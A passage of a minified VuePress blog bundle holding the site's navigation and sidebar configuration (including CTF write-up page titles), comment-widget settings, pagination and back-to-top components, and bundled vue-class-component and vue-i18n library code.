Creek",link:"https://www.programcreek.com/"},{text:"Spring",link:"https://spring.io/"},{text:"Stackoverflow",link:"https://stackoverflow.com/"},{text:"LeetCode",link:"https://leetcode-cn.com/"},{text:"Vue.js",link:"https://cn.vuejs.org/v2/guide/"},{text:"BootCDN",link:"https://www.bootcdn.cn/"},{text:"Linux命令大全",link:"https://www.linuxcool.com/"},{text:"编程语言排行榜",link:"https://www.tiobe.com/tiobe-index/"}]}]},{text:"时间线",link:"/timeline/",icon:"reco-date"},{text:"关于我",link:"/about/",icon:"reco-message"}],sidebar:{"/views/":["",{title:"🍕 知识晶体 Q&A",collapsable:!0,children:["qaq/sum_fe_001","qaq/sum_fe_002","qaq/sum_java_001","qaq/sum_java_002","qaq/sum_db_001","qaq/sum_spring_001","qaq/sum_spring_002","qaq/sum_spring_003","qaq/sum_ms_001"]},{title:"🍳 规范 Standard",collapsable:!0,children:["specification/ali","specification/git","specification/linux01","specification/linux02","specification/objectModel","specification/提交规范","specification/javaNamingConvention","specification/k8s基本命令与pod管理"]},{title:"🏹 前端 Front-end",collapsable:!0,children:["frontend/EChartsStudy","frontend/js-json","frontend/viaStart","frontend/vue-demo","frontend/reco-info","frontend/vuepress-plugin-boxx","frontend/TCP&UDP"]},{title:"🔨 后端 Back-end",collapsable:!0,children:["backend/spring-source-01","backend/spring-source-02","backend/spring-source-03","backend/spring-source-04","backend/spring-source-05","backend/spring-source-06","backend/spring-source-07","backend/spring-source-08","backend/spring-source-09","backend/spring-source-10","backend/spring-source-11","backend/spring-source-12","backend/spring-source-13","backend/spring-source-14","backend/spring-source-15","backend/jdbc-pool-source-01","backend/ArrayList","backend/HashMap","backend/docker","backend/itext","backend/poi","backend/quartz","backend/dubbo","backend/单元测试1","backend/单元测试2","backend/单元测试3","backend/rabbitmq001","backend/rabbitmq002","backend/redis01","backend/redis02","backend/redis使用场景","backend/SSH","backend/jwt","backend/swagger2","backend/thread","backend/ThreadLocal","backend/ThreadPool","backend/ThreadPool2","backend/annotationLog","backend/jvm","backend/juc","backend/javaLock","backend/mysql_explain","backend/mybatis一二级缓存","backend/ReentrantLock","backend/CountDownLatch","backend/zookeeper","backend/分布式系统概述","backend/API网关概述","backend/spring-security-01","backend/spring-security-02","backend/SchedulingConfigurer","backend/ThreadTopCPU","backend/OOM分类及排查","backend/EasyExcel","backend/java_io模型","backend/SPI_JdkDubboSpring","backend/spring_application_json","backend/springboot配置文件加载顺序","backend/动态代理和静态代理区别","backend/zk选举和一致性","backend/超时取消分析","backend/spring-mini-ioc","backend/Spring的IOC源码以及流程分析"]},{title:"🌴 命理学 Numerology",collapsable:!0,children:["numerology/2024-12-04-CTFLearn.md","numerology/2024-12-05-CTFLearn.md","numerology/2024-12-06-CTFLearn.md","numerology/2024-12-07-CTFLearn.md"]},{title:"🔗 随笔 Essay",collapsable:!0,children:["essay/2024-11-15-CTF-view_source-WriteUp","essay/2024-11-16-1-CTF-get_post-WriteUp","essay/2024-11-16-2-CTF-robots-WriteUp","essay/2024-11-16-3-CTF-backup-WriteUp","essay/2024-11-16-4-CTF-cookie-WriteUp","essay/2024-11-17-1-CTF-disabled_button-WriteUp","essay/2024-11-17-2-CTF-simple_js-WriteUp","essay/2024-11-17-3-CTF-xff_referer-WriteUp","essay/2024-11-17-4-CTF-weak_auth-WriteUp","essay/2024-11-19-1-CTF-command_execution-WriteUp","essay/2024-11-20-1-CTF-simple_php-WriteUp","essay/2024-11-23-1-CTF-3861-WriteUp","essay/2024-11-23-2-CTF-3862-WriteUp","essay/2024-11-24-1-CTF-3863-WriteUp","essay/2024-11-24-2-CTF-3871-WriteUp","essay/2024-11-24-3-CTF-3865-WriteUp","essay/2024-11-25-1-CTF-3867-WriteUp","essay/2024-11-26-1-CTF-3866-WriteUp"]}]},isSidebarOpen:!1,authorAvatar:"/vuepress/head-fish.jpg",search:!0,searchMaxSuggestions:10,smoothScroll:!0,sidebarDepth:2,blogConfig:{category:{location:2,text:"分类"},tag:{location:3,text:"标签"}},lastUpdated:"上次更新",author:"North-Glory",record:"京ICP备17067634号-1",startYear:"2024",repo:"north-glory",docsDir:"docs",editLinks:!0,editLinkText:"在 GitHub 上编辑此页！",valineConfig:{appId:"xbT4pPXCWQju5T7GXC5fUFlF-gzGzoHsz",appKey:"bofA5chNQ60p37Ih9sMffSI0",placeholder:"填写邮箱可以收到回复哦!",notify:!0,verify:!0,recordIP:!0}}};t(332),t(22);var De=t(42),Fe={computed:{$recoPosts(){const{$categories:{list:n}}=this;let e=n.reduce((n,e)=>[...n,...e.pages],[]);return e=Object(De.a)(e),Object(De.c)(e),e},$recoPostsForTimeline(){let n=this.$recoPosts;const e={},t=[];n=Object(De.a)(n,!0),this.pages=0==n.length?[]:n;for(let t=0,a=n.length;t<a;t++){const a=n[t],r=Oe(a.frontmatter.date,"year");e[r]?e[r].push(a):e[r]=[a]}for(const n in e){const a=e[n];Object(De.b)(a),t.unshift({year:n,data:a})}return t}}};function Oe(n,e){n=function(n){var e=new Date(n).toJSON();return new Date(+new Date(e)+288e5).toISOString().replace(/T/g," ").replace(/\.[\d]{3}Z/,"").replace(/-/g,"/")}(n);const t=new Date(n),a=t.getFullYear(),r=t.getMonth()+1,o=t.getDate();return"year"==e?a:`${r}-${o}`}t(333);a.a.component("CanvasNest",()=>t.e(47).then(t.bind(null,569))),a.a.component("Clock",()=>Promise.all([t.e(0),t.e(29)]).then(t.bind(null,570))),a.a.component("Clock02",()=>Promise.all([t.e(0),t.e(30)]).then(t.bind(null,571))),a.a.component("Copyright",()=>Promise.resolve().then(t.bind(null,174))),a.a.component("ProjectItem",()=>Promise.all([t.e(0),t.e(31)]).then(t.bind(null,522))),a.a.component("Projects",()=>Promise.all([t.e(0),t.e(2),t.e(1),t.e(3),t.e(23)]).then(t.bind(null,556))),a.a.component("Reward",()=>Promise.all([t.e(0),t.e(32)]).then(t.bind(null,572))),a.a.component("ToDoList",()=>Promise.all([t.e(0),t.e(33)]).then(t.bind(null,573))),a.a.component("Badge",()=>Promise.all([t.e(0),t.e(11)]).then(t.bind(null,574)));var Le={name:"BackToTop",data:()=>({visible:!1,customStyle:{right:"1rem",bottom:"6rem",width:"2.5rem",height:"2.5rem","border-radius":".25rem","line-height":"2.5rem",backgroundColor:"rgba(231, 234, 241,.5)"},visibilityHeight:400}),mounted(){window.addEventListener("scroll",this.throttle(this.handleScroll,500))},beforeDestroy(){window.removeEventListener("scroll",this.throttle(this.handleScroll,500))},methods:{handleScroll(){this.visible=window.pageYOffset>this.visibilityHeight},backToTop(){window.scrollTo(0,0)},throttle(n,e){let t=null,a=Date.now();return function(){const r=Date.now(),o=e-(r-a),i=this,s=arguments;clearTimeout(t),o<=0?(n.apply(i,s),a=Date.now()):t=setTimeout(n,o)}}}},Me=(t(334),Object(Ce.a)(Le,(function(){var n=this._self._c;return n("transition",{attrs:{name:"fade"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:this.visible,expression:"visible"}],staticClass:"back-to-ceiling",style:this.customStyle,on:{click:this.backToTop}},[n("svg",{staticClass:"icon",attrs:{t:"1574745035067",viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"5404"}},[n("path",{attrs:{d:"M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z","p-id":"5405"}}),n("path",{attrs:{d:"M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z","p-id":"5406"}})])])])}),[],!1,null,"c6073ba8",null).exports);t(335),t(336);const Ne={prev:"上一页",next:"下一页",go:"前往",jump:"跳转至"},Re={prev:"上壹頁",next:"下壹頁",go:"前往",jump:"跳轉至"},qe={prev:"Prev",next:"Next",go:"Go",jump:"Jump To"},Ue={prev:"前のページ",next:"次のページ",go:"へ",jump:"ジャンプ"},$e={prev:"이전 페이지",next:"다음 페이지",go:"행",jump:"건너뛰기"};var We={data:()=>({changePage:"",pageSize:10}),props:{total:{type:Number,default:10},perPage:{type:Number,default:10},currentPage:{type:Number,default:1}},computed:{pages(){return Math.ceil(this.total/this.pageSize)},efont:function(){return this.pages>7},indexes:function(){var n=1,e=this.pages,t=[];for(this.pages>=7&&(this.currentPage>5&&this.currentPage<this.pages-4?(n=Number(this.currentPage)-3,e=Number(this.currentPage)+3):this.currentPage<=5?(n=1,e=7):(e=this.pages,n=this.pages-6));n<=e;)t.push(n),n++;return t},pagationLocales(){return function(n){const{$lang:e,$recoLocales:{pagation:t}={}}=n;return t||(/^zh\-(CN|SG)$/.test(e)?Ne:/^zh\-(HK|MO|TW)$/.test(e)?Re:/^ja\-JP$/.test(e)?Ue:/^ko\-KR$/.test(e)?$e:qe)}(this)},showStartFakePageNum:function(){return this.efont&&!this.indexes.includes(1)},showLastFakePageNum:function(){return this.efont&&!this.indexes.includes(this.pages)}},methods:{goPrev(){let n=this.currentPage;this.currentPage>1&&this.emit(--n)},goNext(){let n=this.currentPage;n<this.pages&&this.emit(++n)},jumpPage:function(n){const e=parseInt(n);e<=this.pages&&e>0?this.emit(e):alert(`请输入大于0，并且小于等于${this.pages}的页码！`)},emit(n){this.$emit("getCurrentPage",n)}}},He=(t(337),Object(Ce.a)(We,(function(){var n=this,e=n._self._c;return e("div",{directives:[{name:"show",rawName:"v-show",value:n.pages>1,expression:"pages > 1"}],staticClass:"pagation"},[e("div",{staticClass:"pagation-list"},[e("span",{directives:[{name:"show",rawName:"v-show",value:n.currentPage>1,expression:"currentPage > 1"}],staticClass:"jump",attrs:{unselectable:"on"},on:{click:n.goPrev}},[n._v(n._s(n.pagationLocales.prev))]),n._v(" "),n.showStartFakePageNum?e("span",{staticClass:"jump",on:{click:function(e){return n.jumpPage(1)}}},[n._v("1")]):n._e(),n._v(" "),n.showStartFakePageNum&&n.indexes[0]>2?e("span",{staticClass:"ellipsis"},[n._v("...")]):n._e(),n._v(" "),n._l(n.indexes,(function(t){return e("span",{key:t,staticClass:"jump",class:{bgprimary:n.currentPage==t},on:{click:function(e){return n.jumpPage(t)}}},[n._v(n._s(t))])})),n._v(" "),n.showLastFakePageNum&&n.pages-n.indexes.at(-1)>1?e("span",{staticClass:"ellipsis"},[n._v("...")]):n._e(),n._v(" "),n.showLastFakePageNum?e("span",{staticClass:"jump",on:{click:function(e){return n.jumpPage(n.pages)}}},[n._v(n._s(n.pages))]):n._e(),n._v(" "),n.currentPage<n.pages?e("span",{staticClass:"jump",on:{click:n.goNext}},[n._v(n._s(n.pagationLocales.next))]):n._e(),n._v(" "),e("span",{staticClass:"jumppoint"},[n._v(n._s(n.pagationLocales.jump))]),n._v(" "),e("span",{staticClass:"jumpinp"},[e("input",{directives:[{name:"model",rawName:"v-model",value:n.changePage,expression:"changePage"}],attrs:{type:"text"},domProps:{value:n.changePage},on:{input:function(e){e.target.composing||(n.changePage=e.target.value)}}})]),n._v(" "),e("span",{staticClass:"jump gobtn",on:{click:function(e){return n.jumpPage(n.changePage)}}},[n._v(n._s(n.pagationLocales.go))])],2)])}),[],!1,null,"22b6649c",null).exports),Ve={name:"Valine",props:{options:{type:Object,default:()=>({})}},mounted:function(){this.initValine()},methods:{initValine(){new(t(338))({el:"#valine",placeholder:"just go go",notify:!1,verify:!1,avatar:"retro",visitor:!0,recordIP:!1,path:window.location.pathname,...this.options})}},watch:{$route(n,e){n.path!==e.path&&setTimeout(()=>{this.initValine()},300)}}},Je=(t(339),Object(Ce.a)(Ve,(function(){this._self._c;return this._m(0)}),[function(){var n=this._self._c;return n("div",{staticClass:"valine-wrapper"},[n("div",{attrs:{id:"valine"}})])}],!1,null,null,null).exports);
/**
  * vue-class-component v7.2.6
  * (c) 2015-present Evan You
  * @license MIT
  */
function Qe(n){return(Qe="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n})(n)}function Ge(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function Xe(n){return function(n){if(Array.isArray(n)){for(var e=0,t=new Array(n.length);e<n.length;e++)t[e]=n[e];return t}}(n)||function(n){if(Symbol.iterator in Object(n)||"[object Arguments]"===Object.prototype.toString.call(n))return Array.from(n)}(n)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance")}()}function Ke(){return"undefined"!=typeof Reflect&&Reflect.defineMetadata&&Reflect.getOwnMetadataKeys}function Ze(n,e){Ye(n,e),Object.getOwnPropertyNames(e.prototype).forEach((function(t){Ye(n.prototype,e.prototype,t)})),Object.getOwnPropertyNames(e).forEach((function(t){Ye(n,e,t)}))}function Ye(n,e,t){(t?Reflect.getOwnMetadataKeys(e,t):Reflect.getOwnMetadataKeys(e)).forEach((function(a){var r=t?Reflect.getOwnMetadata(a,e,t):Reflect.getOwnMetadata(a,e);t?Reflect.defineMetadata(a,r,n,t):Reflect.defineMetadata(a,r,n)}))}var nt={__proto__:[]}instanceof Array;function et(n){return function(e,t,a){var r="function"==typeof e?e:e.constructor;r.__decorators__||(r.__decorators__=[]),"number"!=typeof a&&(a=void 0),r.__decorators__.push((function(e){return n(e,t,a)}))}}function tt(n,e){var t=e.prototype._init;e.prototype._init=function(){var e=this,t=Object.getOwnPropertyNames(n);if(n.$options.props)for(var a in n.$options.props)n.hasOwnProperty(a)||t.push(a);t.forEach((function(t){Object.defineProperty(e,t,{get:function(){return n[t]},set:function(e){n[t]=e},configurable:!0})}))};var a=new e;e.prototype._init=t;var r={};return Object.keys(a).forEach((function(n){void 0!==a[n]&&(r[n]=a[n])})),r}var at=["data","beforeCreate","created","beforeMount","mounted","beforeDestroy","destroyed","beforeUpdate","updated","activated","deactivated","render","errorCaptured","serverPrefetch"];function rt(n){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};e.name=e.name||n._componentTag||n.name;var t=n.prototype;Object.getOwnPropertyNames(t).forEach((function(n){if("constructor"!==n)if(at.indexOf(n)>-1)e[n]=t[n];else{var a=Object.getOwnPropertyDescriptor(t,n);void 0!==a.value?"function"==typeof a.value?(e.methods||(e.methods={}))[n]=a.value:(e.mixins||(e.mixins=[])).push({data:function(){return Ge({},n,a.value)}}):(a.get||a.set)&&((e.computed||(e.computed={}))[n]={get:a.get,set:a.set})}})),(e.mixins||(e.mixins=[])).push({data:function(){return tt(this,n)}});var r=n.__decorators__;r&&(r.forEach((function(n){return n(e)})),delete n.__decorators__);var o=Object.getPrototypeOf(n.prototype),i=o instanceof a.a?o.constructor:a.a,s=i.extend(e);return it(s,n,i),Ke()&&Ze(s,n),s}var ot={prototype:!0,arguments:!0,callee:!0,caller:!0};function it(n,e,t){Object.getOwnPropertyNames(e).forEach((function(a){if(!ot[a]){var r=Object.getOwnPropertyDescriptor(n,a);if(!r||r.configurable){var o,i,s=Object.getOwnPropertyDescriptor(e,a);if(!nt){if("cid"===a)return;var l=Object.getOwnPropertyDescriptor(t,a);if(o=s.value,i=Qe(o),null!=o&&("object"===i||"function"===i)&&l&&l.value===s.value)return}0,Object.defineProperty(n,a,s)}}}))}function st(n){return"function"==typeof n?rt(n):function(e){return rt(e,n)}}st.registerHooks=function(n){at.push.apply(at,Xe(n))};var lt=st;function ct(n){return et((function(e,t){void 0===e.inject&&(e.inject={}),Array.isArray(e.inject)||(e.inject[t]=n||t)}))}function pt(n){return"function"!=typeof n||!n.managed&&!n.managedReactive}function dt(n){var e=function(){var t=this,a="function"==typeof n?n.call(this):n;for(var r in(a=Object.create(a||null))[ut]=Object.create(this[ut]||{}),e.managed)a[e.managed[r]]=this[r];var o=function(n){a[e.managedReactive[n]]=i[n],Object.defineProperty(a[ut],e.managedReactive[n],{enumerable:!0,configurable:!0,get:function(){return t[n]}})},i=this;for(var r in e.managedReactive)o(r);return a};return e.managed={},e.managedReactive={},e}var ut="__reactiveInject__";function mt(n){Array.isArray(n.inject)||(n.inject=n.inject||{},n.inject[ut]={from:ut,default:{}})}var ht="undefined"!=typeof Reflect&&void 0!==Reflect.getMetadata;function gt(n,e,t){if(ht&&!Array.isArray(n)&&"function"!=typeof n&&!n.hasOwnProperty("type")&&void 0===n.type){var a=Reflect.getMetadata("design:type",e,t);a!==Object&&(n.type=a)}}function ft(n){return void 0===n&&(n={}),function(e,t){gt(n,e,t),et((function(e,t){(e.props||(e.props={}))[t]=n}))(e,t)}}function bt(n,e){void 0===e&&(e={});var t=e.deep,a=void 0!==t&&t,r=e.immediate,o=void 0!==r&&r;return et((function(e,t){"object"!=typeof e.watch&&(e.watch=Object.create(null));var r=e.watch;"object"!=typeof r[n]||Array.isArray(r[n])?void 0===r[n]&&(r[n]=[]):r[n]=[r[n]],r[n].push({handler:t,deep:a,immediate:o})}))}var vt=t(32);const yt=n=>Object(vt.stringify)(n),xt=(n,e)=>`${n}${Object(vt.stringify)(e,{addQueryPrefix:!0})}`,wt=(n,e)=>`${n.replace(/\/$/,"")}/${e.replace(/^\//,"")}`;var kt=t(164),St=t.n(kt);const Ct=n=>St()(n,"YYYY-MM-DD HH:mm:ss"),Tt=n=>(n.split("#")[0]||"").split("?")[0]||"",jt=n=>Object(vt.parse)(n,{ignoreQueryPrefix:!0})
/*!
 * vue-i18n v8.28.2 
 * (c) 2022 kazuya kawaguchi
 * Released under the MIT License.
 */;var Pt=["compactDisplay","currency","currencyDisplay","currencySign","localeMatcher","notation","numberingSystem","signDisplay","style","unit","unitDisplay","useGrouping","minimumIntegerDigits","minimumFractionDigits","maximumFractionDigits","minimumSignificantDigits","maximumSignificantDigits"],At=["dateStyle","timeStyle","calendar","localeMatcher","hour12","hourCycle","timeZone","formatMatcher","weekday","era","year","month","day","hour","minute","second","timeZoneName"];function Et(n,e){"undefined"!=typeof console&&(console.warn("[vue-i18n] "+n),e&&console.warn(e.stack))}var _t=Array.isArray;function Bt(n){return null!==n&&"object"==typeof n}function It(n){return"string"==typeof n}var zt=Object.prototype.toString;function Dt(n){return"[object Object]"===zt.call(n)}function Ft(n){return null==n}function Ot(n){return"function"==typeof n}function Lt(){for(var n=[],e=arguments.length;e--;)n[e]=arguments[e];var t=null,a=null;return 1===n.length?Bt(n[0])||_t(n[0])?a=n[0]:"string"==typeof n[0]&&(t=n[0]):2===n.length&&("string"==typeof n[0]&&(t=n[0]),(Bt(n[1])||_t(n[1]))&&(a=n[1])),{locale:t,params:a}}function Mt(n){return JSON.parse(JSON.stringify(n))}function Nt(n,e){return!!~n.indexOf(e)}var Rt=Object.prototype.hasOwnProperty;function qt(n,e){return Rt.call(n,e)}function Ut(n){for(var e=arguments,t=Object(n),a=1;a<arguments.length;a++){var r=e[a];if(null!=r){var o=void 0;for(o in r)qt(r,o)&&(Bt(r[o])?t[o]=Ut(t[o],r[o]):t[o]=r[o])}}return t}function $t(n,e){if(n===e)return!0;var t=Bt(n),a=Bt(e);if(!t||!a)return!t&&!a&&String(n)===String(e);try{var r=_t(n),o=_t(e);if(r&&o)return n.length===e.length&&n.every((function(n,t){return $t(n,e[t])}));if(r||o)return!1;var i=Object.keys(n),s=Object.keys(e);return i.length===s.length&&i.every((function(t){return $t(n[t],e[t])}))}catch(n){return!1}}function Wt(n){return null!=n&&Object.keys(n).forEach((function(e){"string"==typeof n[e]&&(n[e]=n[e].replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&apos;"))})),n}var Ht={name:"i18n",functional:!0,props:{tag:{type:[String,Boolean,Object],default:"span"},path:{type:String,required:!0},locale:{type:String},places:{type:[Array,Object]}},render:function(n,e){var t=e.data,a=e.parent,r=e.props,o=e.slots,i=a.$i18n;if(i){var s=r.path,l=r.locale,c=r.places,p=o(),d=i.i(s,l,function(n){var e;for(e in n)if("default"!==e)return!1;return Boolean(e)}(p)||c?function(n,e){var t=e?function(n){0;return Array.isArray(n)?n.reduce(Jt,{}):Object.assign({},n)}(e):{};if(!n)return t;var a=(n=n.filter((function(n){return n.tag||""!==n.text.trim()}))).every(Qt);0;return n.reduce(a?Vt:Jt,t)}(p.default,c):p),u=r.tag&&!0!==r.tag||!1===r.tag?r.tag:"span";return u?n(u,t,d):d}}};function Vt(n,e){return e.data&&e.data.attrs&&e.data.attrs.place&&(n[e.data.attrs.place]=e),n}function Jt(n,e,t){return n[t]=e,n}function Qt(n){return Boolean(n.data&&n.data.attrs&&n.data.attrs.place)}var Gt,Xt={name:"i18n-n",functional:!0,props:{tag:{type:[String,Boolean,Object],default:"span"},value:{type:Number,required:!0},format:{type:[String,Object]},locale:{type:String}},render:function(n,e){var t=e.props,a=e.parent,r=e.data,o=a.$i18n;if(!o)return null;var i=null,s=null;It(t.format)?i=t.format:Bt(t.format)&&(t.format.key&&(i=t.format.key),s=Object.keys(t.format).reduce((function(n,e){var a;return Nt(Pt,e)?Object.assign({},n,((a={})[e]=t.format[e],a)):n}),null));var l=t.locale||o.locale,c=o._ntp(t.value,l,i,s),p=c.map((function(n,e){var t,a=r.scopedSlots&&r.scopedSlots[n.type];return a?a(((t={})[n.type]=n.value,t.index=e,t.parts=c,t)):n.value})),d=t.tag&&!0!==t.tag||!1===t.tag?t.tag:"span";return d?n(d,{attrs:r.attrs,class:r.class,staticClass:r.staticClass},p):p}};function Kt(n,e,t){na(n,t)&&ea(n,e,t)}function Zt(n,e,t,a){if(na(n,t)){var r=t.context.$i18n;(function(n,e){var t=e.context;return n._locale===t.$i18n.locale})(n,t)&&$t(e.value,e.oldValue)&&$t(n._localeMessage,r.getLocaleMessage(r.locale))||ea(n,e,t)}}function Yt(n,e,t,a){if(t.context){var r=t.context.$i18n||{};e.modifiers.preserve||r.preserveDirectiveContent||(n.textContent=""),n._vt=void 0,delete n._vt,n._locale=void 0,delete n._locale,n._localeMessage=void 0,delete n._localeMessage}else Et("Vue instance does not exists in VNode context")}function na(n,e){var t=e.context;return t?!!t.$i18n||(Et("VueI18n instance does not exists in Vue instance"),!1):(Et("Vue instance does not exists in VNode context"),!1)}function ea(n,e,t){var a,r,o=function(n){var e,t,a,r;It(n)?e=n:Dt(n)&&(e=n.path,t=n.locale,a=n.args,r=n.choice);return{path:e,locale:t,args:a,choice:r}}(e.value),i=o.path,s=o.locale,l=o.args,c=o.choice;if(i||s||l)if(i){var p=t.context;n._vt=n.textContent=null!=c?(a=p.$i18n).tc.apply(a,[i,c].concat(ta(s,l))):(r=p.$i18n).t.apply(r,[i].concat(ta(s,l))),n._locale=p.$i18n.locale,n._localeMessage=p.$i18n.getLocaleMessage(p.$i18n.locale)}else Et("`path` is required in v-t directive");else Et("value type not supported")}function ta(n,e){var t=[];return n&&t.push(n),e&&(Array.isArray(e)||Dt(e))&&t.push(e),t}function aa(n,e){void 0===e&&(e={bridge:!1}),aa.installed=!0;var t;(Gt=n).version&&Number(Gt.version.split(".")[0]);(t=Gt).prototype.hasOwnProperty("$i18n")||Object.defineProperty(t.prototype,"$i18n",{get:function(){return this._i18n}}),t.prototype.$t=function(n){for(var e=[],t=arguments.length-1;t-- >0;)e[t]=arguments[t+1];var a=this.$i18n;return a._t.apply(a,[n,a.locale,a._getMessages(),this].concat(e))},t.prototype.$tc=function(n,e){for(var t=[],a=arguments.length-2;a-- >0;)t[a]=arguments[a+2];var r=this.$i18n;return r._tc.apply(r,[n,r.locale,r._getMessages(),this,e].concat(t))},t.prototype.$te=function(n,e){var t=this.$i18n;return t._te(n,t.locale,t._getMessages(),e)},t.prototype.$d=function(n){for(var e,t=[],a=arguments.length-1;a-- >0;)t[a]=arguments[a+1];return(e=this.$i18n).d.apply(e,[n].concat(t))},t.prototype.$n=function(n){for(var e,t=[],a=arguments.length-1;a-- >0;)t[a]=arguments[a+1];return(e=this.$i18n).n.apply(e,[n].concat(t))},Gt.mixin(function(n){function e(){this!==this.$root&&this.$options.__INTLIFY_META__&&this.$el&&this.$el.setAttribute("data-intlify",this.$options.__INTLIFY_META__)}return void 0===n&&(n=!1),n?{mounted:e}:{beforeCreate:function(){var n=this.$options;if(n.i18n=n.i18n||(n.__i18nBridge||n.__i18n?{}:null),n.i18n)if(n.i18n instanceof xa){if(n.__i18nBridge||n.__i18n)try{var e=n.i18n&&n.i18n.messages?n.i18n.messages:{};(n.__i18nBridge||n.__i18n).forEach((function(n){e=Ut(e,JSON.parse(n))})),Object.keys(e).forEach((function(t){n.i18n.mergeLocaleMessage(t,e[t])}))}catch(n){0}this._i18n=n.i18n,this._i18nWatcher=this._i18n.watchI18nData()}else if(Dt(n.i18n)){var t=this.$root&&this.$root.$i18n&&this.$root.$i18n instanceof xa?this.$root.$i18n:null;if(t&&(n.i18n.root=this.$root,n.i18n.formatter=t.formatter,n.i18n.fallbackLocale=t.fallbackLocale,n.i18n.formatFallbackMessages=t.formatFallbackMessages,n.i18n.silentTranslationWarn=t.silentTranslationWarn,n.i18n.silentFallbackWarn=t.silentFallbackWarn,n.i18n.pluralizationRules=t.pluralizationRules,n.i18n.preserveDirectiveContent=t.preserveDirectiveContent),n.__i18nBridge||n.__i18n)try{var a=n.i18n&&n.i18n.messages?n.i18n.messages:{};(n.__i18nBridge||n.__i18n).forEach((function(n){a=Ut(a,JSON.parse(n))})),n.i18n.messages=a}catch(n){0}var r=n.i18n.sharedMessages;r&&Dt(r)&&(n.i18n.messages=Ut(n.i18n.messages,r)),this._i18n=new xa(n.i18n),this._i18nWatcher=this._i18n.watchI18nData(),(void 0===n.i18n.sync||n.i18n.sync)&&(this._localeWatcher=this.$i18n.watchLocale()),t&&t.onComponentInstanceCreated(this._i18n)}else 0;else this.$root&&this.$root.$i18n&&this.$root.$i18n instanceof xa?this._i18n=this.$root.$i18n:n.parent&&n.parent.$i18n&&n.parent.$i18n instanceof xa&&(this._i18n=n.parent.$i18n)},beforeMount:function(){var n=this.$options;n.i18n=n.i18n||(n.__i18nBridge||n.__i18n?{}:null),n.i18n?(n.i18n instanceof xa||Dt(n.i18n))&&(this._i18n.subscribeDataChanging(this),this._subscribing=!0):(this.$root&&this.$root.$i18n&&this.$root.$i18n instanceof xa||n.parent&&n.parent.$i18n&&n.parent.$i18n instanceof xa)&&(this._i18n.subscribeDataChanging(this),this._subscribing=!0)},mounted:e,beforeDestroy:function(){if(this._i18n){var n=this;this.$nextTick((function(){n._subscribing&&(n._i18n.unsubscribeDataChanging(n),delete n._subscribing),n._i18nWatcher&&(n._i18nWatcher(),n._i18n.destroyVM(),delete n._i18nWatcher),n._localeWatcher&&(n._localeWatcher(),delete n._localeWatcher)}))}}}}(e.bridge)),Gt.directive("t",{bind:Kt,update:Zt,unbind:Yt}),Gt.component(Ht.name,Ht),Gt.component(Xt.name,Xt),Gt.config.optionMergeStrategies.i18n=function(n,e){return void 0===e?n:e}}var ra=function(){this._caches=Object.create(null)};ra.prototype.interpolate=function(n,e){if(!e)return[n];var t=this._caches[n];return t||(t=function(n){var e=[],t=0,a="";for(;t<n.length;){var r=n[t++];if("{"===r){a&&e.push({type:"text",value:a}),a="";var o="";for(r=n[t++];void 0!==r&&"}"!==r;)o+=r,r=n[t++];var i="}"===r,s=oa.test(o)?"list":i&&ia.test(o)?"named":"unknown";e.push({value:o,type:s})}else"%"===r?"{"!==n[t]&&(a+=r):a+=r}return a&&e.push({type:"text",value:a}),e}(n),this._caches[n]=t),function(n,e){var t=[],a=0,r=Array.isArray(e)?"list":Bt(e)?"named":"unknown";if("unknown"===r)return t;for(;a<n.length;){var o=n[a];switch(o.type){case"text":t.push(o.value);break;case"list":t.push(e[parseInt(o.value,10)]);break;case"named":"named"===r&&t.push(e[o.value]);break;case"unknown":0}a++}return t}(t,e)};var oa=/^(?:\d)+/,ia=/^(?:\w)+/;var sa=[];sa[0]={ws:[0],ident:[3,0],"[":[4],eof:[7]},sa[1]={ws:[1],".":[2],"[":[4],eof:[7]},sa[2]={ws:[2],ident:[3,0],0:[3,0],number:[3,0]},sa[3]={ident:[3,0],0:[3,0],number:[3,0],ws:[1,1],".":[2,1],"[":[4,1],eof:[7,1]},sa[4]={"'":[5,0],'"':[6,0],"[":[4,2],"]":[1,3],eof:8,else:[4,0]},sa[5]={"'":[4,0],eof:8,else:[5,0]},sa[6]={'"':[4,0],eof:8,else:[6,0]};var 